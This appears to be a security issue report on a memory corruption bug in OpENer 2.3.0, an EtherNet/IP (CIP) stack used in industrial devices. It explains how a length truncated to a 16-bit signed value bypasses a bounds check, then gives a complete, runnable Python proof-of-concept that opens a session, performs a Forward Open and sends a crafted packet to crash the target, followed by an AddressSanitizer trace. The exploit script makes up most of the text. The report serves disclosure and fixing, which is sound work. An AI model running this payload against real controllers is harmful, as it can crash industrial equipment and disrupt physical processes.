@@ -1,0 +1,304 @@
+issue #563
+
+Vulnerability Description
+
+OpENer 2.3.0 (commit 76b95cf) is vulnerable to a severe memory corruption issue caused by integer overflow and signedness truncation. When parsing incoming CIP (Common Industrial Protocol) network packets, the length parameter is inconsistently typed across the call stack. Specifically, an upstream length calculated as an int is passed to a downstream function that expects an EipInt16 (a 16-bit signed integer).
+
+If a maliciously crafted packet with specific length fields is processed, the length parameter can overflow or be truncated into a negative value. This negative length bypasses subsequent bounds checking (due to signed/unsigned comparison issues) and is ultimately used in memory operations, leading to a Stack Buffer Overflow when reading data in DecodePaddedEPath.
+
+Root Cause
+
+The root cause lies in inconsistent integer types and missing bounds checks in source/src/cip/cipmessagerouter.c:
+
+Type Truncation: NotifyMessageRouter(EipUint8 *data, int data_length, ...) receives data_length as a 32-bit int. It then calls CreateMessageRouterRequestStructure(const EipUint8 *data, EipInt16 data_length, ...). If data_length is greater than 32767, it is truncated to a negative EipInt16 value.
+Integer Overflow: In endianconv.c, there are unsafe shift operations (e.g., left shift of 128 by 24 places) that cause Undefined Behavior (UBSan trigger) when processing malicious length fields, contributing to the corrupted length value.
+Bypassed Bounds Check: Inside CreateMessageRouterRequestStructure(), there is a check: if(number_of_decoded_bytes > data_length). Since number_of_decoded_bytes is a size_t (unsigned), the negative data_length is implicitly cast to a massive unsigned value, bypassing the check.
+Underflow to Massive Size: The remaining data size is calculated as request_data_size = data_length - number_of_decoded_bytes. Since request_data_size is size_t, subtracting from a negative value results in an enormous unsigned size. This corrupted size is passed to DecodePaddedEPath, causing a stack buffer overflow when it reads past the bounds of the incoming_message buffer.
+
+PoC
+
+import argparse
+import socket
+import struct
+import sys
+import time
+from typing import Optional, Tuple
+
+
+ENCAP_HEADER_LEN = 24
+
+CMD_REGISTER_SESSION = 0x0065
+CMD_SEND_RR_DATA = 0x006F
+CMD_SEND_UNIT_DATA = 0x0070
+
+ITEM_NULL = 0x0000
+ITEM_CONN_ADDR = 0x00A1
+ITEM_CONN_DATA = 0x00B1
+ITEM_UCMM = 0x00B2
+
+
+def encap_hdr(command: int, length: int, session: int, context: bytes) -> bytes:
+    return (
+        struct.pack("<H", command)
+        + struct.pack("<H", length)
+        + struct.pack("<I", session)
+        + b"\x00" * 4
+        + context[:8].ljust(8, b"\x00")
+        + b"\x00" * 4
+    )
+
+
+def recv_frame(sock: socket.socket) -> Optional[bytes]:
+    hdr = sock.recv(ENCAP_HEADER_LEN)
+    if len(hdr) < ENCAP_HEADER_LEN:
+        return None
+    _, data_len, _, _ = struct.unpack("<HHII", hdr[:12])
+    body = b""
+    while len(body) < data_len:
+        chunk = sock.recv(data_len - len(body))
+        if not chunk:
+            return None
+        body += chunk
+    return hdr + body
+
+
+def register_session(sock: socket.socket, context: bytes) -> int:
+    req = encap_hdr(CMD_REGISTER_SESSION, 4, 0, context) + struct.pack("<HH", 1, 0)
+    sock.sendall(req)
+    resp = recv_frame(sock)
+    if not resp or len(resp) < ENCAP_HEADER_LEN:
+        raise RuntimeError("register response empty")
+    cmd, _, session, status = struct.unpack("<HHII", resp[:12])
+    if cmd != CMD_REGISTER_SESSION or status != 0 or session == 0:
+        raise RuntimeError(
+            "register failed: cmd=0x%04x status=0x%08x" % (cmd, status)
+        )
+    return session
+
+
+def send_rr(sock: socket.socket, session: int, context: bytes, cip: bytes) -> Optional[bytes]:
+    cpf = (
+        struct.pack("<H", 2)
+        + struct.pack("<H", ITEM_NULL)
+        + struct.pack("<H", 0)
+        + struct.pack("<H", ITEM_UCMM)
+        + struct.pack("<H", len(cip))
+        + cip
+    )
+    cmd = b"\x00" * 4 + b"\x00" * 2 + cpf
+    sock.sendall(encap_hdr(CMD_SEND_RR_DATA, len(cmd), session, context) + cmd)
+    return recv_frame(sock)
+
+
+def extract_cip_item(enip_resp: bytes) -> Optional[bytes]:
+    payload = enip_resp[ENCAP_HEADER_LEN:]
+    if len(payload) < 8:
+        return None
+    item_count = struct.unpack_from("<H", payload, 6)[0]
+    off = 8
+    for _ in range(item_count):
+        if off + 4 > len(payload):
+            return None
+        item_type, item_len = struct.unpack_from("<HH", payload, off)
+        off += 4
+        if off + item_len > len(payload):
+            return None
+        data = payload[off : off + item_len]
+        if item_type in (ITEM_UCMM, ITEM_CONN_DATA):
+            return data
+        off += item_len
+    return None
+
+
+def forward_open(sock: socket.socket, session: int, context: bytes, idx: int) -> int:
+    conn_serial = (0x7000 + (idx & 0x0FFF)) & 0xFFFF
+    orig_serial = 0xD34DB33F ^ (idx * 0x01010101)
+    req = (
+        b"\x54\x02\x20\x06\x24\x01"
+        + b"\x07\xf9"
+        + struct.pack("<I", 0x800070BA ^ idx)
+        + struct.pack("<I", 0x80FE70B9 ^ (idx << 8))
+        + struct.pack("<H", conn_serial)
+        + struct.pack("<H", 0x004D)
+        + struct.pack("<I", orig_serial)
+        + b"\x00\x00\x00\x00"
+        + struct.pack("<I", 0x007A1200)
+        + struct.pack("<H", 0x43F4)
+        + struct.pack("<I", 0x007A1200)
+        + struct.pack("<H", 0x43F4)
+        + b"\xA3\x02\x20\x02\x24\x01"
+    )
+
+    resp = send_rr(sock, session, context, req)
+    if not resp:
+        raise RuntimeError("forward-open no response")
+    cip = extract_cip_item(resp)
+    if not cip or len(cip) < 12:
+        raise RuntimeError("forward-open bad response")
+    if cip[0] != 0xD4:
+        raise RuntimeError("forward-open bad service 0x%02x" % cip[0])
+    if cip[2] != 0:
+        ext_vals = []
+        cursor = 4
+        for _ in range(cip[3]):
+            if cursor + 2 > len(cip):
+                break
+            ext_vals.append("0x%04x" % struct.unpack_from("<H", cip, cursor)[0])
+            cursor += 2
+        extra = (", ext=[%s]" % ",".join(ext_vals)) if ext_vals else ""
+        raise RuntimeError("forward-open status=0x%02x%s" % (cip[2], extra))
+    data_off = 4 + cip[3] * 2
+    if len(cip) < data_off + 8:
+        raise RuntimeError("forward-open data too short")
+    return struct.unpack_from("<I", cip, data_off)[0]
+
+
+def send_trigger_payload(
+    sock: socket.socket, session: int, context: bytes, consumed_connection_id: int
+) -> Optional[bytes]:
+    # ConnectedDataItem.length=1 -> (length - 2) becomes negative.
+    connected_data = b"\x00"
+    tail_len = 512 - 45  # align with default receive buffer size
+    tail = bytearray([0x41, 0x0E, 250])  # seq_hi, service, forged path words
+    remain = tail_len - len(tail)
+    tail.extend((bytes([0x20, 0x02]) * ((remain + 1) // 2))[:remain])
+
+    cpf = (
+        struct.pack("<H", 3)
+        + struct.pack("<H", ITEM_CONN_ADDR)
+        + struct.pack("<H", 4)
+        + struct.pack("<I", consumed_connection_id)
+        + struct.pack("<H", ITEM_CONN_DATA)
+        + struct.pack("<H", len(connected_data))
+        + connected_data
+        + bytes(tail)
+    )
+    cmd = b"\x00" * 4 + b"\x00" * 2 + cpf
+    sock.sendall(encap_hdr(CMD_SEND_UNIT_DATA, len(cmd), session, context) + cmd)
+    return recv_frame(sock)
+
+
+def one_attempt(host: str, port: int, timeout: float, idx: int) -> Tuple[bool, str]:
+    context = ("SGN%04d" % idx).encode("ascii")
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.settimeout(timeout)
+    try:
+        sock.connect((host, port))
+        session = register_session(sock, context)
+
+        msgs = []
+        consumed_id = forward_open(sock, session, context, idx)
+        resp = send_trigger_payload(sock, session, context, consumed_id)
+        if resp is None:
+            msgs.append(
+                "trigger sent, no response (possible crash), conn_id=0x%08x"
+                % consumed_id
+            )
+        else:
+            msgs.append(
+                "trigger sent, response len=%d, conn_id=0x%08x"
+                % (len(resp), consumed_id)
+            )
+
+        return True, " | ".join(msgs)
+    except Exception as exc:  # noqa: BLE001
+        return False, "%s: %s" % (type(exc).__name__, exc)
+    finally:
+        try:
+            sock.close()
+        except OSError:
+            pass
+
+
+def main() -> int:
+    parser = argparse.ArgumentParser(
+        description="PoC for signed truncation risk and crash validation"
+    )
+    parser.add_argument("--host", default="127.0.0.1")
+    parser.add_argument("--port", type=int, default=44818)
+    parser.add_argument("--attempts", type=int, default=5)
+    parser.add_argument("--timeout", type=float, default=1.5)
+    args = parser.parse_args()
+
+    print(
+        "[*] target=%s:%d attempts=%d"
+        % (args.host, args.port, args.attempts)
+    )
+    for i in range(args.attempts):
+        ok, info = one_attempt(args.host, args.port, args.timeout, i)
+        print("[%03d] %s - %s" % (i + 1, "OK" if ok else "FAIL", info))
+        if i + 1 < args.attempts:
+            time.sleep(0.15)
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
+
+ASan
+
+networkhandler: opened new TCP connection on fd 22
+/home/user/OpENer/source/src/enet_encap/endianconv.c:101:76: runtime error: left shift of 128 by 24 places cannot be represented in type 'int'
+something is wrong with the length in Message Router @ CreateCommonPacketFormatStructure
+=================================================================
+==522093==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffc44fc2890 at pc 0x55b1462f26ae bp 0x7ffc44fc1be0 sp 0x7ffc44fc1bd0
+READ of size 1 at 0x7ffc44fc2890 thread T0
+    #0 0x55b1462f26ad in DecodePaddedEPath /home/user/OpENer/source/src/cip/cipcommon.c:1403
+    #1 0x55b146310bbe in CreateMessageRouterRequestStructure /home/user/OpENer/source/src/cip/cipmessagerouter.c:254
+    #2 0x55b14631017c in NotifyMessageRouter /home/user/OpENer/source/src/cip/cipmessagerouter.c:188
+    #3 0x55b146323142 in NotifyConnectedCommonPacketFormat /home/user/OpENer/source/src/enet_encap/cpf.c:173
+    #4 0x55b14632a555 in HandleReceivedSendUnitDataCommand /home/user/OpENer/source/src/enet_encap/encap.c:526
+    #5 0x55b146327865 in HandleReceivedExplictTcpData /home/user/OpENer/source/src/enet_encap/encap.c:191
+    #6 0x55b1462debe6 in HandleDataOnTcpSocket /home/user/OpENer/source/src/ports/generic_networkhandler.c:864
+    #7 0x55b1462dcd8a in NetworkHandlerProcessCyclic /home/user/OpENer/source/src/ports/generic_networkhandler.c:497
+    #8 0x55b1462da513 in executeEventLoop /home/user/OpENer/source/src/ports/POSIX/main.c:261
+    #9 0x55b1462da3bd in main /home/user/OpENer/source/src/ports/POSIX/main.c:229
+    #10 0x7f4ba2672082 in __libc_start_main ../csu/libc-start.c:308
+    #11 0x55b1462d9bed in _start (/home/user/OpENer/bin/posix/src/ports/POSIX/OpENer+0x89bed)
+
+Address 0x7ffc44fc2890 is located in stack of thread T0 at offset 1312 in frame
+    #0 0x55b1462de27b in HandleDataOnTcpSocket /home/user/OpENer/source/src/ports/generic_networkhandler.c:720
+
+  This frame has 6 object(s):
+    [48, 52) 'remaining_bytes' (line 722)
+    [64, 68) 'fromlen' (line 852)
+    [80, 88) 'read_buffer' (line 760)
+    [112, 128) 'sender_address' (line 850)
+    [144, 672) 'outgoing_message' (line 862)
+    [800, 1312) 'incoming_message' (line 732) <== Memory access at offset 1312 overflows this variable
+HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
+      (longjmp and C++ exceptions *are* supported)
+SUMMARY: AddressSanitizer: stack-buffer-overflow /home/user/OpENer/source/src/cip/cipcommon.c:1403 in DecodePaddedEPath
+Shadow bytes around the buggy address:
+  0x1000089f04c0: 00 00 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2
+  0x1000089f04d0: f2 f2 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x1000089f04e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x1000089f04f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x1000089f0500: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=>0x1000089f0510: 00 00[f3]f3 f3 f3 f3 f3 f3 f3 00 00 00 00 00 00
+  0x1000089f0520: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x1000089f0530: 00 00 00 00 00 00 00 00 f1 f1 f1 f1 06 f3 f3 f3
+  0x1000089f0540: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x1000089f0550: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x1000089f0560: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07 
+  Heap left redzone:       fa
+  Freed heap region:       fd
+  Stack left redzone:      f1
+  Stack mid redzone:       f2
+  Stack right redzone:     f3
+  Stack after return:      f5
+  Stack use after scope:   f8
+  Global redzone:          f9
+  Global init order:       f6
+  Poisoned by user:        f7
+  Container overflow:      fc
+  Array cookie:            ac
+  Intra object redzone:    bb
+  ASan internal:           fe
+  Left alloca redzone:     ca
+  Right alloca redzone:    cb
+  Shadow gap:              cc
+==522093==ABORTING
